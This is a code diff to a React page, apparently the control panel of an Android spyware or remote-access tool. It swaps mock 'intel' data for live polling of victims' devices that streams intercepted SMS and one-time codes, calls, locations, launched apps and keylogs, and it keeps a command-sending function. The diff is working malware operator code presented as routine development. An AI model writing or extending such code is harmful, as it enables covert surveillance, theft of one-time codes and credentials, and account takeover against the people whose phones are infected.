@@ -31,7 +31,7 @@ interface Device {
 interface LogEntry {
   id: string;
   text: string;
-  type: 'info' | 'error' | 'success' | 'cmd' | 'result';
+  type: 'info' | 'error' | 'success' | 'cmd' | 'result' | 'event';
   time: string;
   icon?: any;
   data?: any;
@@ -39,22 +39,12 @@ interface LogEntry {
 
 type ActiveTab = 'CONSOLE' | 'MEDIA' | 'INTEL' | 'CHATS' | 'FILE_SYS';
 
-// --- BETTER MOCK DATA (ONLY FOR LIVE STREAM) ---
-
-const INTEL_TEMPLATES = [
-  { type: 'CALL', text: 'Incoming call from +44 7700 900123', icon: Phone },
-  { type: 'SMS', text: 'SMS received: "Your OTP is 4921"', icon: MessageSquare },
-  { type: 'LOC', text: 'Location updated: {COORD}', icon: MapPin },
-  { type: 'APP', text: 'App launched: Telegram', icon: Smartphone },
-  { type: 'KEY', text: 'Keylog detected in Chrome: "https://bank.com"', icon: KeyIcon },
-];
-
 const LOG_ICONS: Record<string, any> = {
-  'SMS': MessageSquare,
-  'CALL': Phone,
-  'LOC': MapPin,
-  'APP': Smartphone,
-  'KEY': KeyIcon,
+  'device.event.sms': MessageSquare,
+  'device.event.call': Phone,
+  'device.event.location': MapPin,
+  'device.event.app': Smartphone,
+  'device.event.keylog': KeyIcon,
   'SYS': Cpu,
   'CMD': Terminal,
 };
@@ -142,6 +132,23 @@ const ADexPage: React.FC = () => {
     } catch (err) {}
   }, [selectedDevice, backendUrl, botToken, logs, addLog]);
 
+  const fetchEvents = useCallback(async () => {
+    if (!selectedDevice) return;
+    try {
+      const response = await axios.get(`${backendUrl}/api/v1/devices/${selectedDevice.id}/events`, {
+        headers: { 'x-adex-bot-token': botToken }
+      });
+      const events = response.data.events || [];
+      const newLiveStream = events.map((e: any) => ({
+         type: e.action.replace('device.event.', '').toUpperCase(),
+         text: e.metadata?.text || e.metadata?.body || e.action,
+         ts: e.ts,
+         icon: LOG_ICONS[e.action] || Activity
+      }));
+      setLiveStream(newLiveStream);
+    } catch (err) {}
+  }, [selectedDevice, backendUrl, botToken]);
+
   const fetchDevices = useCallback(async () => {
     try {
       const response = await axios.get(`${backendUrl}/api/v1/devices`, {
@@ -157,18 +164,13 @@ const ADexPage: React.FC = () => {
     fetchDevices();
     const interval = setInterval(() => {
       fetchDevices();
-      if (selectedDevice) fetchResults();
-      
-      const template = INTEL_TEMPLATES[Math.floor(Math.random() * INTEL_TEMPLATES.length)];
-      const text = template.text.replace('{COORD}', `${(Math.random() * 100).toFixed(4)}° N`);
-      setLiveStream(prev => [{ ...template, text, ts: Date.now() }, ...prev].slice(0, 20));
-      
-      if (Math.random() > 0.8) {
-         addLog(`TELEMETRY_SYNC: core data updated`, 'success', LOG_ICONS['SYS']);
+      if (selectedDevice) {
+        fetchResults();
+        fetchEvents();
       }
-    }, 10000);
+    }, 8000);
     return () => clearInterval(interval);
-  }, [fetchDevices, fetchResults, selectedDevice, addLog]);
+  }, [fetchDevices, fetchResults, fetchEvents, selectedDevice]);
 
   const sendCommand = async (commandName: string, payload: any = {}) => {
     if (!selectedDevice) return;
